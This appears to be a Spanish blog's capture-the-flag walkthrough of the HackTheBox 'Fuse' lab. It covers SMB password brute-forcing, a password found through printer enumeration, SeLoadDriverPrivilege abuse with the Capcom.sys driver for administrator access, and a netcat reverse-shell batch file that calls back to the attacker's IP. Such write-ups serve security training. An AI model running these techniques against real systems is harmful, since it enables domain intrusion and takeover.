@@ -1,0 +1,1057 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Fuse</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Fuse | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Fuse" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Windows nivel medio. Usaremos varios usuarios como diccionario para encontrar uno valido en el sistema, estando dentro explotaremos un permiso que nos deja subir drivers, subiremos uno conocido que tiene vulnerabilidades, aprovecharemos eso para lograr ejecución remota de comandos como Administrador. Debemos cambiarle claramente cosas al exploit por lo tanto debe ser compilado." />
+<meta property="og:description" content="Máquina Windows nivel medio. Usaremos varios usuarios como diccionario para encontrar uno valido en el sistema, estando dentro explotaremos un permiso que nos deja subir drivers, subiremos uno conocido que tiene vulnerabilidades, aprovecharemos eso para lograr ejecución remota de comandos como Administrador. Debemos cambiarle claramente cosas al exploit por lo tanto debe ser compilado." />
+<link rel="canonical" href="http://localhost:4000/htb/fuse" />
+<meta property="og:url" content="http://localhost:4000/htb/fuse" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/bannerfuse.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-10-31T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/bannerfuse.png" />
+<meta property="twitter:title" content="HackTheBox - Fuse" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2020-10-31T00:00:00-07:00","datePublished":"2020-10-31T00:00:00-07:00","description":"Máquina Windows nivel medio. Usaremos varios usuarios como diccionario para encontrar uno valido en el sistema, estando dentro explotaremos un permiso que nos deja subir drivers, subiremos uno conocido que tiene vulnerabilidades, aprovecharemos eso para lograr ejecución remota de comandos como Administrador. Debemos cambiarle claramente cosas al exploit por lo tanto debe ser compilado.","headline":"HackTheBox - Fuse","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/bannerfuse.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/fuse"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/fuse"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Fuse</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2020-10-31">31 Oct 2020</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/bannerfuse.png" alt="HackTheBox - Fuse">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Windows nivel medio. Usaremos varios usuarios como diccionario para encontrar uno valido en el sistema, estando dentro explotaremos un permiso que nos deja subir drivers, subiremos uno conocido que tiene vulnerabilidades, aprovecharemos eso para lograr ejecución remota de comandos como Administrador. Debemos cambiarle claramente cosas al exploit por lo tanto debe ser compilado.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/fuseHTB.png" alt="fuseHTB" /></p>
+
+<h3 id="como-siempre-primero-nuestro-tldr-spanish-writeup">Como siempre, primero nuestro TL;DR (Spanish writeup)</h3>
+
+<p>Holas, bueno, inicialmente encontraremos varios usuarios en el <code>portal web</code>, haremos uso de <code>html2dic</code> para crear un diccionario y realizar fuerza bruta contra el servicio <code>SMB</code> para encontrar credenciales del usuario <code>bnielson</code>, nos veremos en la tarea de modificar su contraseña, ya que está caducada, usaremos <code>smbpasswd</code>.</p>
+
+<p>Con sus credenciales enumerando <code>rpcclient</code> encontraremos una contraseña guardada en una impresora y otros usuarios del sistema… Haremos una nueva fase de fuerza bruta para así conseguir el usuario <code>svc-print</code> el cual está asociado a esa contraseña, ya dentro de la máquina haciendo enumeración básica, vemos que el privilegio <code>SeLoadDriverPrivilege</code> está habilitado, lo usaremos para subir un driver de <strong>CapCom</strong>, el cual tiene algunas vulnerabilidades reportadas y una de ellas nos permitirá ejecutar una Shell como administrador… A darle candela.</p>
+
+<blockquote>
+  <p>Acá un copie y pegue: Claramente vas a encontrar mucho texto, pero como he dicho en otros writeups, me enfoco en plasmar mis errores y existos, asi mismo aveces explico algo de más y me inspiro hablando (:, sin más, muchas gracias y a romper todo.</p>
+</blockquote>
+
+<ul>
+  <li>Cree un <a href="https://github.com/lanzt/blog/tree/main/assets/scripts/HTB/fuse/autopwn_fuse.sh">autopwn</a> para la subida y ejecucion de los archivos, para finalmente obtener la reverse shell… Pero hay un problema, no se cual sea por que entiendo que la logica y el llamado esta bien, pero la revsh la hace mal. (Subo el script por si alguno quiere hecharle un ojo y ver que problema tiene el llamado pa que me cuente pls…).</li>
+</ul>
+
+<h3 id="fases">Fases.</h3>
+
+<p>Como casi siempre tendremos 3 fases.</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a>.</li>
+  <li><a href="#explotacion">Explotación</a>.</li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración.</h2>
+
+<p>Empezamos obteniendo que puertos tiene activos la maquina. Usaremos <code>nmap</code> (:</p>
+
+<pre><code class="language-bash">$ nmap -p- --open -T4 -Pn -v 10.10.10.193 -oG initScant
+</code></pre>
+
+<p>El escaneo va muy lento (realmente lento), una solucion podria ser cambiar <code>-T</code> por <code>--min-rate</code>, que le indica cuantos paquetes queremos enviar en cada petición… Pero validando primero el output de la ejecucion con <code>-T</code> y la ejecucion con el <code>--min-rate</code> veo que hay unos puertos que no alcanza a detectar, por lo tanto nos quedaremos con el output inicial con <code>-T</code>.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-T4</td>
+      <td style="text-align: left">Forma de escanear super rapido, (claramente hace mucho ruido, pero al ser controlado no nos preocupamos)</td>
+    </tr>
+    <tr>
+      <td>–min-rate</td>
+      <td style="text-align: left">Indica que no queremos hacer peticiones menores al num que pongamos (i.e: –min-rate=5000)</td>
+    </tr>
+    <tr>
+      <td>-Pn</td>
+      <td style="text-align: left">Evita que realice Host Discovery, tales como Ping (P) y DNS (n)</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable, ya veremos para que</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/nmapinitScan.png" alt="nmapinitScan" /></p>
+
+<p>Ahora, con la función que creo <a href="https://s4vitar.github.io/">s4vitar</a> podemos extraer los puertos del archivo <strong>initScan</strong> diciendole que nos los copie en la clipboard, evitando tener que escribirlos uno a uno para nuestro siguiente escaneo. La funcion simplemente en mi caso se agregaria al <code>$ ~/.bashrc</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png" alt="extractPorts" /></p>
+
+<pre><code class="language-bash">$ extractPorts initScan
+</code></pre>
+
+<p>Ahora que tenemos los puertos, haremos un escaneo para validar que versión y scripts maneja cada uno.</p>
+
+<pre><code class="language-bash">nmap -p53,80,135,139,445,636,3268,49667 -sC -sV 10.10.10.193
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/nmapportScan.png" alt="nmapportScan" /></p>
+
+<p>Bien, analicemos que tenemos destacable…</p>
+
+<ul>
+  <li>Puerto DNS (53)</li>
+  <li>Puerto web (80)</li>
+  <li>RPC (135 y 49667)</li>
+  <li>SMB (445 y Netbios (139))</li>
+  <li>LDAP (3269) nos muestra el dominio</li>
+</ul>
+
+<p>Ademas podemos destacar que en base a los scripts nos extrajo el nombre del dominio en el que vamos a tener que trabajar <code>Domain name: fabricorp.local</code> y el FQDN, el cual incluye el nombre de la computadora y el nombre del dominio, <code>FQDN: Fuse.fabricorp.local</code>.</p>
+
+<h3 id="veamos-el-puerto-dns-53">Veamos el puerto DNS (53)</h3>
+
+<p>Podemos indicarle mediante <code>dig</code> que es una herramienta que realiza busquedas en los registros DNS, que nos traiga cualquier informacion asociada a esa IP con su dominio.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/diganydomain.png" alt="diganydomain" /></p>
+
+<p>Acá tambien se nos lista el FQDN y otro host <code>hostmaster</code> que anotaremos por si algo. Por ahora nada más por acá.</p>
+
+<h3 id="veamos-el-servicio-web-80">Veamos el servicio web (80)</h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/pageip.png" alt="pageip" /></p>
+
+<p>Cuando ponemos la ip nos redirecciona a <code>fuse.fabricorp.local/papercut/logs/html/index.htm</code>. Entonces podemos modificar nuestro archivo <code>$ /etc/hosts</code> indicandole que cuando hagamos una peticion a <code>10.10.10.193</code> nos de la respuesta de <code>fuse.fabricorp.local</code>.</p>
+
+<pre><code class="language-bash">$ cat /etc/hosts
+127.0.0.1       localhost
+10.10.10.193    fuse.fabricorp.local
+...
+</code></pre>
+
+<p>Y si ahora intentamos ingresar ya sea por la IP o por el mismo dominio que pusimos nos responde así.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/pagefusefabricorp.png" alt="pagefusefabricorp" /></p>
+
+<p>Nos encontramos con un software llamado <strong>PaperCut™ Print Logger</strong>.</p>
+
+<blockquote>
+  <p>“Es una aplicación gratuita para plataformas de Windows que registra las operaciones de impresión y proporciona en tiempo real registros detallados de la actividad de su impresora.” <a href="https://www.papercut.com/products/free-software/print-logger/spanish/">PaperCut</a>.</p>
+</blockquote>
+
+<p>Perfecto, tenemos 3 logs, ademas de ver los logs podemos tambien ver usuarios (vamos creando una lista de ellos) que probablemente alguno nos funcione para usarlo despues.</p>
+
+<p>Siendo un DC por lo general los usuarios son registrados de la siguiente forma:</p>
+
+<blockquote>
+  <p>i.e: Si el nombre es <code>Mara Toure</code>, lo mas común sería <code>mtoure</code>.</p>
+</blockquote>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/pagelogs.png" alt="pagelogs" /></p>
+
+<p>Ademas en el log del <strong>29 de mayo</strong> podemos ver que se hace referencia a un <strong>Notepad</strong> y que su titulo parece tener otro usuario: <code>bnielson</code>, anotemoslo en la lista de users.</p>
+
+<p>Si descargamos algun <code>.csv</code> nos imprime la misma información de la web, en este caso descargamos el log del 29 de mayo (si, la imagen lo dice, pero bueno, hay gente que se le pasa y se pierde :P)</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/pagedownload29may.png" alt="pagedownload29may" /></p>
+
+<p>Lo que nos podemos dar cuenta es que algunas impresiones tienen documentos “impresionantes e.e”.</p>
+
+<ul>
+  <li>backup_tapes - Notepad</li>
+  <li>Fabricorp01.docx - Word</li>
+  <li>printing_issue_test - Notepad</li>
+</ul>
+
+<p>Estas son las que destaco… De resto no veo que más podemos sacar de acá.</p>
+
+<h3 id="veamos-el-puerto-smb-445">Veamos el puerto SMB (445)</h3>
+
+<p>No logre hacer nada, ni <code>smbclient</code> ni <code>smbmap</code> y <code>crackmapexec</code> solo me mostraba que el servidor SMB está soportado por un Windows Server 2016 Standard, que esto también lo vimos en el escaneo a las versiones.</p>
+
+<h3 id="veamos-el-puerto-ldap-3269">Veamos el puerto LDAP (3269)</h3>
+
+<p>Nada tampoco :(</p>
+
+<p>…</p>
+
+<p>Al estar prácticamente estancado decidí pedir ayuda, me indicaron que probara crear un wordlist para el usuario y otro para la password y buscara con que herramienta probar los diccionarios… Pues lo primero será crear las wordlist, en esta fase tuve algunos problemas, ya que <code>CeWL</code> no tomaba todas las palabras completas, buscando en internet encontré <code>html2dic</code> que como dice, toma un <strong>html</strong> extrae las palabras y el output queda en formato de <strong>diccionario</strong>. Así que ese output lo guardaremos en un archivo que llamaremos <code>dic.txt</code>.</p>
+
+<p>El tema con <code>html2dic</code> es que debemos hacer la extracción con cada página.</p>
+
+<pre><code class="language-bash">$ curl -s http://fuse.fabricorp.local/papercut/logs/html/papercut-print-log-2020-05-29.htm &gt; dic
+$ html2dic dic &gt; dic.txt
+$ cat dic.txt | sort | uniq &gt; dic.txt
+#Seguimos con otra pagina y repetimos, solo que al hacer la linea del `uniq` evitamos borrar el contenido que tenemos y lo sobre escribimos con **&gt;&gt;**
+$ ...
+$ cat dic.txt | sort | uniq &gt;&gt; dic.txt
+$ ...
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/bashwordlists.png" alt="bashwordlists" /></p>
+
+<p>Listo, ya teniendo los dos wordlist, podemos usar <code>CrackMapExec</code> hacia <code>SMB</code> para validar si obtenemos algo.</p>
+
+<pre><code class="language-bash">$ cme smb 10.10.10.193 -u users.txt -p dic.txt
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/bashcmepass.png" alt="bashcmepass" /></p>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación.</h2>
+
+<p>Bien, obtenemos algo raro, pero al menos es diferente, nos indica que la password debe ser cambiada… Buscando con el error que nos sale, vemos varios foros, en uno de ellos hablan de <code>smbpasswd</code> y su flag <code>-r (remote)</code>, la cual nos permite cambiar la password de un usuario de SMB, pues nada, a probar :P.</p>
+
+<ul>
+  <li><a href="https://samba.samba.narkive.com/I0oDpMEz/smbclient-says-nt-status-password-must-change-how-to-change-password">smbclient-says-nt-status-password-must-change-how-to-change-password</a>.</li>
+  <li><a href="http://samba.2283325.n4.nabble.com/FAILED-with-error-NT-STATUS-PASSWORD-MUST-CHANGE-td2445714.html">FAILED-with-error-NT-STATUS-PASSWORD-MUST-CHANGE</a>.</li>
+</ul>
+
+<pre><code class="language-bash">$ smbpasswd -r 10.10.10.193 -U 'bnielson'
+Old SMB password:
+New SMB password:
+Retype new SMB password:
+Password changed for user bnielson
+</code></pre>
+
+<p>…</p>
+
+<blockquote>
+  <p>El escaneo inicial me dejo con dudas, ya que no vi algún puerto disponible para usar <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> y podernos conectar con algunas credenciales de manera remota al pc. Por eso decidi hacer otro escaneo pero total, sin parametros ni nada, el resultado fue este:</p>
+</blockquote>
+
+<pre><code class="language-bash">$ nmap -p- --open -vvv 10.10.10.193
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/nmaptotalscan.png" alt="nmapTotalScan" /></p>
+
+<p>Y si, varios puertos que no habíamos visto, entre ellos uno para el mantenimiento remoto: 5985, sigamos (:</p>
+
+<p>La password que le asigne es <strong>Estaes01</strong>. Pero al ser un usuario al que todos deben de cambiar la contraseña, pues cada <strong>x</strong> segundos nuestra password deja de funcionar, así que o somos rápidos o crearemos un script (realmente intente hacer el script pero no lo logre, si alguien sabe como jugar con los inputs de cada comando hábleme y me enseña por favor), así que fui rápido :P, posteriormente usaremos <code>crackmapexec</code> para ver a que recursos tenemos acceso y con <code>smbget</code> nos descargaremos el recurso a nuestra máquina para ya olvidarnos de cambiar contraseñas y todo ese rollo :)</p>
+
+<pre><code class="language-bash">$ cme smb 10.10.10.193 -u bnielson -p Estaes001 --shares
+...
+#Vemos varios recursos, `print$` y `SYSVOL` son interesantes, descargemos los dos
+$ smbget -R smb://10.10.10.193/SYSVOL -U bnielson
+$ smbget -R smb://10.10.10.193/print$ -U bnielson
+</code></pre>
+
+<blockquote>
+  <p>¿Por que SYSVOL es importante?, generalmente se usa un script para cambiar la contraseña del admin local, necesario para cumplir las <strong>gpp (Preferencias de politica de grupo)</strong>, ese script esta guardado en la ruta <code>SYSVOL</code> y a menudo en texto claro.</p>
+</blockquote>
+
+<ul>
+  <li><a href="https://www.youtube.com/watch?v=bFmBBgncY4o&amp;t=1768">Video de s4vitar explicando SYSVOL</a>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/bashcmepass.png" alt="bashcmepass" /></p>
+
+<p>El directorio <code>SYSVOL</code> nos da un error, al parecer hay un archivo al cual no tenemos acceso y nos cancela toda la descarga.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/bashsmbsysvolfail.png" alt="bashsmbsysvolfail" /></p>
+
+<p>Podemos usar <code>smbclient</code> para entrar en el directorio <code>/SYSVOL</code> e intentar descargar desde ahí los archivos. Así mismo podemos usar <code>rpcclient</code> para con las nuevas credenciales ver que podemos encontrar (de los comandos que encontré, pude obtener otro conjunto de usuarios, pero nada más).</p>
+
+<pre><code class="language-bash">$ smbclient //10.10.10.193/SYSVOL -U bnielson
+
+recurse ON # Carpetas y subcarpetas
+prompt OFF # Para que no pregunte si realmente queremos descargar X folder
+mget *     # Descargar todo
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/bashsmbsysvoldone.png" alt="bashsmbsysvoldone" /></p>
+
+<p>En este caso si nos permitió bajar los otros archivos :)</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/bashlsprintysys.png" alt="bashlsprintysys" /></p>
+
+<p>Pero enumerando el directorio <code>/SYSVOL</code>, no tiene nada relevante, así que seguiremos con <code>/print$</code>… Enumerando y enumerando no encontré nada, haciendo grep, por tipos de archivo, volviendo a descargar pensando que se me había olvidado algo, pero nada, estuve perdido, así que lo mejor fue pedir ayuda.</p>
+
+<p>Me indicaron que usara <code>rpcclient</code> peeero con un comando que no había usado, <strong>enumprinters</strong>, el cual nos muestra info de las impresoras y alguna que otra descripción, pues…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/rpccenumprinters.png" alt="rpccenumprinters" /></p>
+
+<p>Opa, vemos una contraseña, tomémosla y validemos con <code>cme</code> junto a los usuarios que tenemos (y los nuevos).</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/bashcmesvcprint.png" alt="bashcmesvcprint" /></p>
+
+<p>Listo, vemos que tenemos el mismo acceso que <code>bnielson</code>, probemos de una con <code>evil-winrm</code> por el puerto <strong>5985</strong> que encontramos con el nuevo escaneo.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/evilwrsvcprint.png" alt="evilwrsvcprint" /></p>
+
+<p>Ahoraaaa a enumerar.</p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios.</h2>
+
+<p>Si hacemos búsquedas de servicios o software corriendo no obtenemos nada, subiendo <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS"><strong>winPEAS</strong></a> y/o <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1"><strong>PowerUp.ps1</strong></a> tampoco, ni enumerando carpetas y subcarpetas tenemos algo… Solamente en el directorio raíz tenemos un <code>readme.txt</code> y una carpeta <code>/test</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/evilwrreadme.png" alt="evilwrreadme" /></p>
+
+<blockquote>
+  <p><strong>Spoiler</strong>: Es probable que las demas carpetas tengan proteccion con un antivirus o algo por el estilo, por lo tanto tambien es probable que si se creo una carpeta en la raiz llamada <strong>test</strong> (en la que podemos hacer cualquier cosa) pues que no tenga o no nos tengamos que preocupar por alguna proteccion con <strong>AV</strong>.</p>
+</blockquote>
+
+<p>Viendo los permisos que tiene el usuario <code>svc-print</code> con <strong>whoami /priv</strong> (también con <strong>/all</strong> los muestra) de primeras ninguno me sorprendió, así que busque info de cada uno y uno de ellos tiene algo interesante.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/evilwrwhoamipriv.png" alt="evilwrwhoamipriv" /></p>
+
+<p>El privilegio <code>SeLoadDriverPrivilege</code> nos permite subir un driver al kernel, por lo cual explorando en internet vemos que hay un driver explotable: <strong>Capcom</strong>, el cual con otra utilidad (la que lo explota) nos permita ejecutar una reverse Shell con permisos de administrador</p>
+
+<p>En nuestro caso tenemos el privilegio ya activado, por lo tanto solo nos queda la explotación. Hay dos buenos post para guiarse:</p>
+
+<ul>
+  <li><a href="https://www.tarlogic.com/blog/explotacion-de-la-directiva-cargar-y-descargar-controladores-de-dispositivo-seloaddriverprivilege/">Español - Tarlogic</a>.</li>
+  <li><a href="https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#seloaddriverprivilege">Ingles - HackTricks</a>.</li>
+</ul>
+
+<p>Usando el código del <code>NTLoadDriver.cpp</code> podemos intentar subir el driver <a href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys"><strong>Capcom.sys</strong></a>.</p>
+
+<p>Nos indica que usa dos argumentos:</p>
+
+<ul>
+  <li>Le indicamos donde está ubicado el driver que queremos subir.</li>
+  <li>Registro del kernel donde guardar el driver, junto al SID (ID de seguridad) de usuario.</li>
+</ul>
+
+<p>Muy bien, sabiendo esto, démosle al <code>NTLoadDriver</code>, obteniendo el SID de <code>svc-print</code> vemos esto:</p>
+
+<pre><code class="language-powershell">PS&gt; Get-ADUser -Identity 'svc-print' | select SID
+
+S-1-5-21-2633719317-1471316042-3957863514-1104
+</code></pre>
+
+<p>Lo siguiente es compilar o buscar los binarios, para posteriormente subirlos a la máquina, así que podemos usar <code>Visual Studio</code> para ello. Primero usamos el código de <strong>HackTricks</strong>…</p>
+
+<p>La compilación y la ejecución parecen estar bien, pero no obtengo ningún output… Estuve modificando y buscando otras maneras pero no encontré, le tuve que volver a pedir ayuda a <a href="https://www.hackthebox.eu/profile/49335"><strong>TazWake</strong></a> moderador HTB y un duro en seguridad. Me indico que el no había hecho ese procedimiento, que había usado un ejecutable de <a href="https://www.hackthebox.eu/profile/158833"><strong>VbScrub</strong></a>. El cual también nos permite subir un driver pasándole los dos parámetros del <strong>NTLoadDriver</strong>. Además me recalco el posible uso de AV en toda la maquina menos en la carpeta <strong>test</strong> de la raíz (Este era el <strong>spoiler</strong>, ya que antes estaba guardando y ejecutando todo en otra carpeta).</p>
+
+<ul>
+  <li><a href="https://github.com/VbScrub/VbLoadDriver">Herramienta de VbScrub: VbLoadDriver</a>.</li>
+</ul>
+
+<p>Y pasandole los mismos parametros de antes, su uso seria:</p>
+
+<pre><code class="language-powershell">&gt; VbLoadDriver.exe HKU\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\Services\Capcom C:\test\Capcom.sys
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/evilwruploaddriverdone.png" alt="evilwruploaddriverdone" /></p>
+
+<p>Listo, logramos ejecutar correctamente el binario. Ahora solo nos queda hablar sobre como explotar <strong>Capcom.sys</strong>.</p>
+
+<p>Existe una utilidad llamada <a href="https://github.com/tandasat/ExploitCapcom"><strong>ExploitCapcom</strong></a> ¿Bastante intuitiva no?. Pues lo que tenemos que indicarle es (aunque lo intente sin las 2 primeras linea y me funciono igual :P):</p>
+
+<pre><code class="language-powershell">&gt; sc.exe create Capcom type= kernel binPath= C:\test\Capcom.sys
+&gt; sc.exe start Capcom
+&gt; ./ExploitCapcom.exe
+</code></pre>
+
+<p>Listo, conociendo su uso debemos modificar esta porcion de codigo:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/vsexploitcaprevshell.png" alt="vsexploitcaprevshell" /></p>
+
+<p>Para llegar a esa solución tuve muchos (muchos) intentos fallidos y básicamente fue por no parar y buscar sobre la función que ejecuta el comando en el sistema.</p>
+
+<ul>
+  <li><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">Documentación de Microsoft sobre <strong>CreateProcess()</strong></a>.</li>
+</ul>
+
+<p>Apoyándome en esa descripción, es que entendí que debía indicarle como primer parámetro (nombre de la aplicación): <code>NULL</code>, ya que estamos en la consola y no estoy ejecutando ninguna aplicación… Y en el segundo parámetro (linea de comando) si dejar la petición de la revshell.</p>
+
+<p>Compilando, subiendo y ejecutando logramos obtener la dichosa Shell como administrador :)</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/flags_fuse.png" alt="flags_fuse" /></p>
+
+<p>…</p>
+
+<p>Después caí en cuenta que para evitar tantas compilaciones, sencillamente hubiera podido crear un archivo <code>.bat</code> con las instrucciones del <strong>netcat</strong> y que el ejecutable llamara a ese archivo .__ .</p>
+
+<p>Creamos el archivo:</p>
+
+<pre><code class="language-bash">&gt; echo "@echo off" &gt; retrievemagic.bat
+&gt; echo "C:\test\nc.exe 10.10.15.35 4433 -e cmd.exe" &gt;&gt; retrievemagic.bat
+</code></pre>
+
+<p>Y después simplemente le indicamos que siempre nos ejecute ese archivo :)</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/vsexploitcapcomwithbatfile.png" alt="vsexploitcaprevshell" /></p>
+
+<p>…</p>
+
